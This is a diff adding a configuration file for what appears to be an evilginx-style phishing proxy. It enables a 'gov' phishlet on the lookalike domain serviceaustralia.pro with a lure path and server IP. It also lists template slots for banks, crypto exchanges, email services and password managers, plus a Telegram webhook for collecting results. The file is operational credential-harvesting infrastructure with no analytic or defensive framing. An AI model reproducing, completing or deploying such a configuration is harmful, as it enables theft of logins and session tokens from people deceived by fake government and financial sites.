@@ -1,0 +1,85 @@
+blacklist_mode: unauth
+cookie_key: ""
+ip: 179.43.189.46
+lures:
+    - hostname: ""
+      path: /Gukqthcl
+      redirect_url: ""
+      phishlet: gov
+      template: ""
+      ua_filter: ""
+      info: ""
+      og_title: ""
+      og_desc: ""
+      og_image: ""
+      og_url: ""
+nkpbot_enabled: false
+ota_enabled: false
+proxy_address: ""
+proxy_enabled: false
+proxy_password: ""
+proxy_port: 0
+proxy_type: http
+proxy_username: ""
+redirect_key: vo
+server: serviceaustralia.pro
+simplebot_enabled: false
+site_domains:
+    amazon: ""
+    aws: ""
+    binance: ""
+    blockchain: ""
+    boa: ""
+    bypass-flagged: ""
+    canada: ""
+    cex: ""
+    chase: ""
+    coinbase: ""
+    cryptobox: ""
+    dashlane: ""
+    discord: ""
+    dropbox: ""
+    europol: ""
+    facebook: ""
+    flexiti: ""
+    gemini: ""
+    gend: ""
+    github: ""
+    glady: ""
+    google: ""
+    gov: serviceaustralia.pro
+    hightail: ""
+    icloud: ""
+    instagram: ""
+    knowbe4: ""
+    lastpass: ""
+    lcl: ""
+    linkedin: ""
+    mail: ""
+    mailgun: ""
+    nsbank: ""
+    o365: ""
+    outlook: ""
+    ovh: ""
+    payfit: ""
+    payoneer: ""
+    paypal: ""
+    poloniex: ""
+    protonmail: ""
+    sendgrid: ""
+    skrill: ""
+    skype: ""
+    snapchat: ""
+    stripe: ""
+    tiktok: ""
+    twitter: ""
+    xfinity: google2.com
+    yahoo: ""
+sites_enabled:
+    - gov
+turnstile_privkey: ""
+turnstile_sitekey: ""
+verification_key: mf
+verification_token: d88e
+webhook_telegram: 
+webhook_verbosity: 1
